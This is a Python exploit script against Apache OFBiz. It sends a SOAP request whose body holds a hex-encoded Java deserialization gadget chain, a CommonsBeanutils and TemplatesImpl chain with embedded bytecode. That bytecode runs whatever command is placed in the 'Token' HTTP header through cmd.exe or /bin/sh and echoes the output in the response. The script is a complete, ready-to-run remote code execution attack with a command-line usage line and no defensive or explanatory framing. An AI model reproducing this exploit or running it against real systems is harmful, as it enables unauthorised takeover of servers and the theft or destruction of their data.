import sys
import requests
from requests.api import head
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check(target, command):
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
        "Content-Type": "text/xml",
        "Token": command
    }
    url = "{}/webtools/control/SOAPService".format(target)
    data = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
    <soapenv:Header/>  
    <soapenv:Body>
        <ser>
        <map-Map>
            <map-Entry>
            <map-Key>
                <cus-obj>ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372003F6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F723C6A6176612E4265616E436F6D70617261746F72E3A188EA7322A4480200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B7870737200596F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F723C6A6176612E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372004D636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C3C6A6176612E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DC1CAFEBABE0000003300D5010013537475625472616E736C65745061796C6F61640700D00100106A6176612F6C616E672F4F626A65637407000301000A536F7572636546696C65010018537475625472616E736C65745061796C6F61642E6A6176610100083C636C696E69743E010003282956010004436F64650100106A6176612F6C616E672F54687265616407000A01000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B0C000C000D0A000B000E01000E67657454687265616447726F757001001928294C6A6176612F6C616E672F54687265616447726F75703B0C001000110A000B0012010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0C001400150A000400160100077468726561647308001801000F6A6176612F6C616E672F436C61737307001A0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B0C001C001D0A001B001E0100226A6176612F6C616E672F7265666C6563742F41636365737369626C654F626A65637407002001000D73657441636365737369626C65010004285A29560C002200230A002100240100176A6176612F6C616E672F7265666C6563742F4669656C64070026010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C002800290A0027002A0100135B4C6A6176612F6C616E672F5468726561643B07002C0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B0C002E002F0A000B0030010004657865630800320100106A6176612F6C616E672F537472696E67070034010008636F6E7461696E7301001B284C6A6176612F6C616E672F4368617253657175656E63653B295A0C003600370A003500380100046874747008003A01000B426C6F636B506F6C6C657208003C01000674617267657408003E0100126A6176612F6C616E672F52756E6E61626C6507004001000674686973243008004201000768616E646C657208004401001E6A6176612F6C616E672F4E6F537563684669656C64457863657074696F6E07004601000D6765745375706572636C6173730C004800150A001B0049010006676C6F62616C08004B01000A70726F636573736F727308004D01000E6A6176612F7574696C2F4C69737407004F01000473697A650100032829490C005100520B005000530100152849294C6A6176612F6C616E672F4F626A6563743B0C002800550B0050005601000372657108005801000B676574526573706F6E736508005A0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0C005C005D0A001B005E0100186A6176612F6C616E672F7265666C6563742F4D6574686F64070060010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C006200630A00610064010009676574486561646572080066010005546F6B656E0800680100076973456D70747901000328295A0C006A006B0A0035006C01000973657453746174757308006E0100116A6176612F6C616E672F496E7465676572070070010004545950450100114C6A6176612F6C616E672F436C6173733B0C0072007309007100740100063C696E69743E010004284929560C007600770A007100780100076F732E6E616D6508007A0100106A6176612F6C616E672F53797374656D07007C01000B67657450726F7065727479010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0C007E007F0A007D008001000B746F4C6F776572436173650C0082002F0A0035008301000677696E646F77080085010007636D642E6578650800870100022F630800890100072F62696E2F736808008B0100022D6308008D0100116A6176612F7574696C2F5363616E6E657207008F0100186A6176612F6C616E672F50726F636573734275696C646572070091010016285B4C6A6176612F6C616E672F537472696E673B29560C007600930A00920094010005737461727401001528294C6A6176612F6C616E672F50726F636573733B0C009600970A009200980100116A6176612F6C616E672F50726F6365737307009A01000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0C009C009D0A009B009E010018284C6A6176612F696F2F496E70757453747265616D3B29560C007600A00A009000A10100025C410800A301000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0C00A500A60A009000A70100046E6578740C00A9002F0A009000AA010008676574427974657301000428295B420C00AC00AD0A003500AE0100246F72672E6170616368652E746F6D6361742E7574696C2E6275662E427974654368756E6B0800B0010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0C00B200B30A001B00B401000B6E6577496E7374616E636501001428294C6A6176612F6C616E672F4F626A6563743B0C00B600B70A001B00B801000873657442797465730800BA0100025B420700BC0100116765744465636C617265644D6574686F640C00BE005D0A001B00BF010007646F57726974650800C101001F6A6176612F6C616E672F4E6F537563684D6574686F64457863657074696F6E0700C30100136A6176612E6E696F2E427974654275666665720800C5010004777261700800C70100136A6176612F6C616E672F457863657074696F6E0700C90100156A6176612F6C616E672F54687265616447726F75700700CB0100135B4C6A6176612F6C616E672F537472696E673B0700CD01000D537461636B4D61705461626C6501001873756E2F50776E6572313734393331343538353139383335010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700D10C007600080A00D200D30021000200D2000000000002000800070008000100090000043C000A001700000330A70003014C033DB8000FB600134E2DB600171219B6001F3A04190404B6002519042DB6002BC0002D3A0503360615061905BEA202FD19051506323A07190701A60006A702E71907B600313A0819081233B600399A000D1908123BB600399A0006A7000D1908123DB60039990006A702BC1907B60017123FB6001F3A04190404B6002519041907B6002B3A091909C100419A0006A702961909B600171243B6001F3A04190404B6002519041909B6002B3A091909B600171245B6001F3A04A7001A3A0A1909B60017B6004AB6004A1245B6001F3A04A70003190404B6002519041909B6002B3A091909B60017B6004A124CB6001F3A04A700143A0B1909B60017124CB6001F3A04A70003190404B6002519041909B6002B3A091909B60017124EB6001F3A04190404B6002519041909B6002BC000503A0C03360D150D190CB900540100A201D5190C150DB9005702003A0E190EB600171259B6001F3A04190404B600251904190EB6002B3A0F190FB60017125B03BD001BB6005F190F03BD0004B600653A10190FB60017126704BD001B5903123553B6005F190F04BD00045903126953B60065C000353A08190801A5000B1908B6006D990006A701521910B60017126F04BD001B5903B2007553B6005F191004BD00045903BB0071591100C8B7007953B6006557127BB80081B600841286B6003999001906BD003559031288535904128A535905190853A7001606BD00355903128C535904128E5359051908533A11BB009059BB0092591911B70095B60099B6009FB700A212A4B600A8B600ABB600AF3A1212B1B800B53A131913B600B93A09191312BB06BD001B590312BD535904B20075535905B2007553B600C0190906BD000459031912535904BB00715903B70079535905BB0071591912BEB7007953B60065571910B6001712C204BD001B5903191353B6005F191004BD00045903190953B6006557A700513A1412C6B800B53A15191512C804BD001B590312BD53B600C0191504BD00045903191253B600653A091910B6001712C204BD001B5903191553B6005F191004BD00045903190953B6006557A70003043D1C990006A70009840D01A7FE251C990006A70014A7000B3A16A70006A70000840601A7FD01B1000400B100BD00C0004700E600F500F80047024402B702BA00C40035031E032100CA000100CF000000DA001B03FF002900070005010700CC07002707002D010000FC001707000BFC001A070035020902FC002507000469070047166007004710FF002F000E0005010700CC07002707002D0107000B0700350700040000070050010000FE007E07000407000407000402FB0050520700CEFF009A00130005010700CC07002707002D0107000B0700350700040000070050010700040700040700040700CE0700BD00010700C4FB004DF9000106F8000506FF000200070005010700CC07002707002D0100010700CA04FF000200070005010700CC07002707002D01000005000100760008000100090000001100010001000000052AB700D4B100000000000100050000000200067074000450776E72707701007871007E000D78</cus-obj>
            </map-Key>  
            <map-Value>  
                <std-String/>
            </map-Value>
            </map-Entry>
        </map-Map>
        </ser>
    </soapenv:Body>
    </soapenv:Envelope>
    """
    res = requests.post(url=url, data=data, headers=headers, verify=False, proxies=proxies)
    try:
        result = re.compile("(.*)<\?xml", re.S).findall(res.text)[0]
        print(result)
    except Exception as e:
        print("no result")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit("Usage: %s <URL to ofbiz> <command>") % sys.argv[0]
    
    target = sys.argv[1]
    check(sys.argv[1], sys.argv[2])